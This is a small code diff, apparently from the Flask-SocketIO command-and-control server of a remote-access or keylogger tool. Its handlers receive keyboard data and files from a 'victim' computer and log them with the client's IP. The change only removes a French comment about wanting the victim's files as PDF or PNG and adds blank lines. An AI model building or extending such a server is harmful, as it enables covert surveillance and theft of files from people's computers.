@@ -450,7 +450,7 @@ def handle_keyboard(data):
             db.session.add(new_command)
             db.session.commit()
 
-#je veux le fichier de la victime en pdf ou png pas en zip
+
 @socketio.on('pc_victim_response')
 def handle_pc_victim(data):
     sid = request.sid
@@ -466,6 +466,7 @@ def handle_pc_victim(data):
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Fichier de la victime reçu de {client.ip} et enregistré sous {file_path}")
+
 
 @socketio.on('disconnect')
 def handle_disconnect():
